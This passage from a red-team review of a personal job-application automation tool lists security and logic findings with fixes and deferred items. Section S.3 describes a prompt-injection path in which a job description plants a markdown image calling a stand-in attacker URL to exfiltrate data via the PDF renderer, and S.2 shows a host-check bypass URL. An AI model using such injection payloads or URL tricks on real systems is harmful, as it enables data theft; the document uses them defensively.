- **[P3] Hardcoded "2" years-of-experience** (`linkedin/fields.py`) — fine for
  co-op (student mode) but wrong for senior full-mode roles. Wire to a
  `profile.yml` experience map before the full-mode LinkedIn push.
- **[P3] httpx client churn**, **[P3] storage/ umask** — low priority on a
  single-user machine.

## R.3 Verdict

The system is sound for its actual use (attended, manual-submit-by-default,
single operator). The one change that mattered before the August full-mode
flip — the Workday blind-fill — is fixed. The rest are correctly-identified
hardening items whose blast radius is bounded by "operator reviews before
acting"; schedule them with the full-mode / any-unattended-mode work, not
before.

---

# Section S — Red-Team Review, Round 2 (2026-07-06, codex restored)

Codex quota was restored and it ran the full read-only audit that R.1/R.2
missed (that pass was agy-only). Codex was sharper on security and caught
several real items agy did not. Cross-validated across codex + agy + host.

## S.1 Fixed in this pass (low-risk, high-confidence, or confirmed-by-data)

- **WebSearch/discovery results silently dropped** (codex P1, host-confirmed) —
  `scan_via_websearch` and `scan_discovery_channels` build jobs with
  `location=""`, and the Canada filter treats empty location as non-Canadian,
  so tier-2/3 discovery (incl. the new immigration channels) returned nothing
  in default mode. Fix: `_passes_canada_filter` keeps unknown locations;
  discovery-channel jobs now carry the queried location. Functional bug that
  neutered a feature added earlier the same day.
- **Tracker pipe-injection** (codex P1, **confirmed by real data** — the 3
  malformed rows fixed earlier this session were exactly this) — a `|` in a
  scraped title shifted columns. Fix: `_cell` escapes `|`/newlines on write;
  `parse_tracker_line` splits on unescaped pipes and unescapes, so cells
  round-trip.
- **`bool("false")` type confusion** (codex P1) — an LLM emitting the string
  `"false"` for `generate_pdf` would render a PDF (truthy string). Fix:
  `_coerce_bool` handles string forms.

## S.2 Confirmed, NOT yet fixed — auto-submit hardening (schedule before enabling)

Codex verdict: DO_NOT_MERGE, disable auto-submit until fixed. Auto-submit is
OFF by default (needs `--auto-submit` + profile flag + `mode==full`), so the
attended fill-only/manual-submit workflow the operator actually uses is
unaffected. But these must land before auto-submit is ever switched on —
especially relevant now that mode is flipping to full:

- **[P0] Workday host-check is a substring** — `"myworkdayjobs.com" in url`
  matches `https://myworkdayjobs.com@evil/`. Combined with fail-open
  (`required_empty`/review-gate return empty on parse exceptions), auto-submit
  could fire on the wrong/broken page. Fix: parse the host, allowlist it,
  require an explicit Review-step marker, and fail CLOSED on every parser
  exception.
- **[P0] LinkedIn auto-submits with guessed legal answers** — same flag reaches
  LinkedIn Easy Apply; authorization="Yes"/sponsorship="No"/experience="2" are
  guessed. Legal/sponsorship/experience questions must require per-application
  human confirmation before any auto-submit.
- **[P1] Click ≠ confirmed** — `auto_submit.confirmed` and the `Applied` row are
  emitted after the click even if the post-submit load check fails. Record
  `SubmissionUnknown` + evidence unless a positive success marker is seen.
- **[P1] Missing/malformed profile → placeholder facts** — profile_loader
  returns "Example Candidate" identity + example experience/education on load
  failure, which Workday fillers consume (broader than the embedded-fallback
  fixed in R.1). Missing/invalid candidate data must abort fill + auto-submit.

## S.3 Confirmed, deferred (bounded blast radius on an attended local tool)

- **[P1] Prompt injection incl. PDF-renderer network exfil** — a JD-injected
  `![](https://attacker/collect?…)` in generated CV markdown → Playwright PDF
  renderer fetches it. Block all renderer network requests; validate LLM JSON
  with strict schemas; recompute the score gate locally. (Extends R.2's prompt
  note with a concrete exfil path.)
- **[P1] Dashboard stored-XSS + CDN Chart.js** (`dashboard_html.py`) — tracker
  values via `innerHTML`, JSON inlined in a script, CDN dep. Local-only render
  but real: bundle locally, `textContent`, escape `<`, add CSP.
- **[P1] Email spoofing / status regression** — no SPF/DKIM check; an old
  "application received" can regress Interview→Applied. Enforce monotonic
  transitions + sender-domain mapping; require review for Offer/Rejection.
- **[P1] Sensitive artifacts `0644`; Slack webhook URL in stored exception
  text** — tighten to `0700`/`0600`, redact webhook URLs from logs.
- **[P2] Browser-profile / IPC can target the wrong application**; **[P2] JSONL
  + usage counters not process-safe**; **[P2] lockfile not enforced on install**
  (`uv sync --frozen`); **[P3] host-local clock vs configured TZ**; **[P3] comp
  parser concatenates digits** (`80K–100K`→`80100`).

## S.4 Verdict

Fill-only/manual-submit (the operator's real workflow) is sound. Auto-submit
carries genuine P0s and must stay OFF until S.2 lands — this is now a gating
item for the full-mode switch, since flipping to full is what makes
auto-submit reachable at all.
